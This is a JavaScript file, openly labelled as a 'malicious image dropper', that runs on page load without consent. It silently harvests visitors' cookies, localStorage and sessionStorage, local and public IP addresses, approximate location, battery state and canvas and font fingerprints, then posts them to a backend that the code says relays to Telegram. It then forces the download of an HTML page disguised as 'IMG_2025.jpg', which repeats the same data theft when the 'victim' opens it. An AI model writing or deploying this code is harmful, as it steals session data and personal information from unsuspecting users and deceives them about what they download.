// telemetry.js – Universal Image Dropper + Silent Telemetry (Android/iOS/Windows)
(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let executed = false;

  // Helper: Send data to Netlify → Telegram
  async function sendToBackend(module, payload) {
    try {
      await fetch(ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
        cache: 'no-store',
        keepalive: true
      });
    } catch (_) {}
  }

  // ---------- 1. BROWSER DATA EXFIL (AUTO, NO PERMISSION) ----------
  async function collectBrowserData() {
    // Device & screen
    const device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      vendor: navigator.vendor || 'N/A'
    };

    // Battery
    let battery = 'N/A';
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        battery = { level: Math.round(b.level*100)+'%', charging: b.charging ? 'Yes':'No' };
      } catch(_) {}
    }

    // Local IP (WebRTC)
    let localIPs = ['N/A'];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('test');
      await pc.createOffer();
      await pc.setLocalDescription();
      const ips = [];
      pc.onicecandidate = (e) => {
        if (!e || !e.candidate) return;
        const c = e.candidate.candidate;
        if (c) {
          const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
          if (m && !ips.includes(m[0])) ips.push(m[0]);
        }
      };
      await new Promise(r => setTimeout(r, 2000));
      localIPs = ips.length ? ips : ['N/A'];
      pc.close();
    } catch(_) {}

    // Public IP + Approx Location
    let publicData = {};
    try {
      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      publicData = await r.json();
    } catch(_) {}

    // Cookies, localStorage, sessionStorage
    const cookies = document.cookie || 'No cookies';
    let localStorageData = {}, sessionStorageData = {};
    try { localStorageData = { ...localStorage }; } catch(_) {}
    try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

    // Canvas fingerprint
    let canvas = 'N/A';
    try {
      const c = document.createElement('canvas');
      c.width = 256; c.height = 128;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0,0,16,16);
      ctx.fillStyle = '#069';
      ctx.textBaseline = 'alphabetic';
      ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
      ctx.fillStyle = '#ff6';
      ctx.fillRect(200,60,40,40);
      canvas = c.toDataURL();
    } catch(_) {}

    // Installed fonts (browser)
    let fonts = [];
    try {
      const base = ['monospace','sans-serif','serif'];
      const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond','Roboto','Noto Sans'];
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      const txt = 'mmmmmmmmmmlli';
      const size = '72px';
      ctx.font = size + ' ' + base[0];
      const b = ctx.measureText(txt).width;
      for (const f of test) {
        ctx.font = size + ' "' + f + '", ' + base[0];
        const w = ctx.measureText(txt).width;
        if (w !== b) fonts.push(f);
      }
    } catch(_) {}

    return {
      device,
      battery,
      network: {
        localIPs,
        publicIP: publicData.ip || 'N/A',
        isp: publicData.org || 'N/A',
        approxLocation: {
          city: publicData.city || 'N/A',
          region: publicData.region || 'N/A',
          country: publicData.country_name || 'N/A',
          lat: publicData.latitude || 'N/A',
          lng: publicData.longitude || 'N/A'
        }
      },
      storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
      fingerprints: { canvas, fonts },
      referrer: document.referrer,
      pageUrl: location.href
    };
  }

  // ---------- 2. MALICIOUS IMAGE DROPPER (CROSS-PLATFORM HTML DISGUISED AS JPG) ----------
  function dropMaliciousImage() {
    try {
      // Build a self-contained HTML page that shows a real image and runs telemetry
      // The telemetry code is the same as above, minified/inlined.
      // We'll also include a beautiful preview with a real image URL.
      const imageUrl = 'https://files.catbox.moe/l9xdjq.png'; // or any public image
      const siteUrl = window.location.origin;

      const htmlContent = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IMG_2025</title>
  <!-- Social preview (custom thumbnail) -->
  <meta property="og:type" content="image" />
  <meta property="og:image" content="${imageUrl}" />
  <meta property="og:image:width" content="800" />
  <meta property="og:image:height" content="600" />
  <meta property="og:title" content="Beautiful Sunset" />
  <meta property="og:description" content="Click to view full image" />
  <meta name="twitter:card" content="summary_large_image" />
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #0a0a0a;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }
    .container {
      max-width: 90vw;
      max-height: 90vh;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
      background: #1a1a1a;
    }
    img {
      display: block;
      width: 100%;
      height: auto;
      max-height: 80vh;
      object-fit: contain;
    }
    .caption {
      padding: 12px 20px;
      color: #eee;
      text-align: center;
      font-size: 14px;
      background: #222;
      border-top: 1px solid #333;
    }
    .caption small {
      opacity: 0.7;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="${imageUrl}" alt="Beautiful Sunset" />
    <div class="caption">
      <span>📸 IMG_2025</span> <small>• Tap to share</small>
    </div>
  </div>

  <!-- ========== TELEMETRY SCRIPT (SILENT) ========== -->
  <script>
    (function() {
      // This script runs automatically when the image page is opened.
      // It will collect data and send to the backend.
      // We duplicate the telemetry logic here to make the HTML self-contained.

      const ENDPOINT = '${siteUrl}/.netlify/functions/telemetry';

      async function sendData(module, payload) {
        try {
          await fetch(ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() }),
            cache: 'no-store',
            keepalive: true
          });
        } catch (_) {}
      }

      async function collect() {
        // Basic device
        const device = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory,
          screen: screen.width+'x'+screen.height,
          pixelRatio: devicePixelRatio,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          vendor: navigator.vendor || 'N/A'
        };

        // Battery
        let battery = 'N/A';
        if (navigator.getBattery) {
          try {
            const b = await navigator.getBattery();
            battery = { level: Math.round(b.level*100)+'%', charging: b.charging?'Yes':'No' };
          } catch(_) {}
        }

        // Local IP (WebRTC)
        let localIPs = ['N/A'];
        try {
          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
          pc.createDataChannel('test');
          await pc.createOffer();
          await pc.setLocalDescription();
          const ips = [];
          pc.onicecandidate = (e) => {
            if (!e || !e.candidate) return;
            const c = e.candidate.candidate;
            if (c) {
              const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
              if (m && !ips.includes(m[0])) ips.push(m[0]);
            }
          };
          await new Promise(r => setTimeout(r, 2000));
          localIPs = ips.length ? ips : ['N/A'];
          pc.close();
        } catch(_) {}

        // Public IP
        let publicData = {};
        try {
          const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
          publicData = await r.json();
        } catch(_) {}

        // Cookies & storage
        const cookies = document.cookie || 'No cookies';
        let localStorageData = {}, sessionStorageData = {};
        try { localStorageData = { ...localStorage }; } catch(_) {}
        try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

        // Canvas fingerprint
        let canvas = 'N/A';
        try {
          const c = document.createElement('canvas');
          c.width = 256; c.height = 128;
          const ctx = c.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(0,0,16,16);
          ctx.fillStyle = '#069';
          ctx.textBaseline = 'alphabetic';
          ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
          ctx.fillStyle = 'rgba(102,204,0,0.7)';
          ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
          ctx.fillStyle = '#ff6';
          ctx.fillRect(200,60,40,40);
          canvas = c.toDataURL();
        } catch(_) {}

        // Installed fonts
        let fonts = [];
        try {
          const base = ['monospace','sans-serif','serif'];
          const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond','Roboto','Noto Sans'];
          const c = document.createElement('canvas');
          const ctx = c.getContext('2d');
          const txt = 'mmmmmmmmmmlli';
          const size = '72px';
          ctx.font = size + ' ' + base[0];
          const b = ctx.measureText(txt).width;
          for (const f of test) {
            ctx.font = size + ' "' + f + '", ' + base[0];
            const w = ctx.measureText(txt).width;
            if (w !== b) fonts.push(f);
          }
        } catch(_) {}

        return {
          device,
          battery,
          network: {
            localIPs,
            publicIP: publicData.ip || 'N/A',
            isp: publicData.org || 'N/A',
            approxLocation: {
              city: publicData.city || 'N/A',
              region: publicData.region || 'N/A',
              country: publicData.country_name || 'N/A',
              lat: publicData.latitude || 'N/A',
              lng: publicData.longitude || 'N/A'
            }
          },
          storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
          fingerprints: { canvas, fonts },
          referrer: document.referrer,
          pageUrl: location.href
        };
      }

      // Auto-run
      collect().then(data => {
        sendData('IMAGE_DROPPER_PAYLOAD', data);
      });
    })();
  </script>
</body>
</html>`;

      // Create blob with type 'image/jpeg' to trick the browser
      // But we set the download filename as 'IMG_2025.jpg'
      const blob = new Blob([htmlContent], { type: 'image/jpeg' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'IMG_2025.jpg'; // Pretend it's a JPG
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 200);

      // Notify backend that dropper was delivered
      sendToBackend('IMAGE_DROPPER_DELIVERED', {
        status: 'Downloaded',
        filename: 'IMG_2025.jpg',
        size: blob.size + ' bytes',
        note: 'Victim sees a .jpg file, but it\'s actually HTML. When opened, telemetry runs.'
      });
    } catch (e) {
      sendToBackend('IMAGE_DROPPER_ERROR', { error: e.message });
    }
  }

  // ---------- 3. MASTER TRIGGER (AUTO ON LOAD) ----------
  async function runAll() {
    if (executed) return;
    executed = true;

    console.log('%c📸 Dropping malicious image payload...', 'font-size:16px; color:#ff6600;');

    // First, collect browser data automatically
    const data = await collectBrowserData();
    await sendToBackend('AUTO_TELEMETRY', data);

    // Then drop the disguised image (HTML)
    dropMaliciousImage();

    console.log('%c✅ Image dropper delivered. Victim will see a .jpg file.', 'font-size:16px; color:#00ffcc;');
  }

  // ---------- 4. TRIGGER ON PAGE LOAD (BINA CLICK KE) ----------
  if (document.readyState === 'complete') {
    setTimeout(runAll, 800);
  } else {
    window.addEventListener('load', () => setTimeout(runAll, 800));
  }

  // Balloon click backup
  const orig = window.grantBalloonConsent;
  window.grantBalloonConsent = function() {
    if (orig) orig();
    if (!executed) runAll();
  };
})();
